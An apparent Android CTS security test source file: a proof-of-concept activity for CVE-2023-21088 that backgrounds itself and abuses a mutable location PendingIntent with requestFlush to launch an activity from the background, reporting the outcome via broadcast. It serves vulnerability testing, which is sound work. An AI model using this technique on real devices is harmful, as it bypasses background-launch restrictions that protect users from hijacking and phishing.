/*
 * Copyright (C) 2023 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2023_21088;

import static android.provider.Settings.ACTION_SETTINGS;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.location.LocationManager;
import android.os.Handler;

import java.util.List;

public class PocActivity extends Activity {

    @Override
    protected void onResume() {
        try {
            super.onResume();
            final int requestCode = 1;
            final int waitMs = 2000;

            // To move task in background according to task issue.
            moveTaskToBack(true);
            LocationManager locationManager = getSystemService(LocationManager.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(this, requestCode,
                    new Intent(this, TargetActivity.class), PendingIntent.FLAG_MUTABLE);
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0 /* minTimeMs */ ,
                    0 /* minDistanceM */, pendingIntent);

            // Using handler() to update the thread from the background thread to the main thread
            // using looper to be run after the specified amount of time elapses.
            Handler handler = new Handler();
            Runnable runnable = new Runnable() {
                @Override
                public void run() {
                    if (!isAppOnForeground()) {
                        // On vulnerable device, calling requestFlush() causes TargetActivity to be
                        // launched.
                        locationManager.requestFlush(LocationManager.GPS_PROVIDER, pendingIntent,
                                requestCode);
                    }
                }
            };
            handler.postDelayed(runnable, waitMs);
            startActivity(new Intent(ACTION_SETTINGS));
            sendBroadcast(new Intent(getString(R.string.bcastAction))
                    .putExtra(getString(R.string.status), getString(R.string.noExceptionMsg)));
        } catch (Exception e) {
            try {
                sendBroadcast(new Intent(getString(R.string.bcastAction))
                        .putExtra(getString(R.string.status), e.getMessage()));
            } catch (Exception ignored) {
                // ignore any exceptions
            }
        }
    }

    private boolean isAppOnForeground() {
        ActivityManager activityManager = getSystemService(ActivityManager.class);
        List<ActivityManager.RunningAppProcessInfo> appProcesses =
                activityManager.getRunningAppProcesses();
        if (appProcesses == null) {
            return false;
        }
        final String packageName = getPackageName();
        for (ActivityManager.RunningAppProcessInfo appProcess : appProcesses) {
            if (appProcess.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
                    && appProcess.processName.equals(packageName)) {
                return true;
            }
        }
        return false;
    }
}
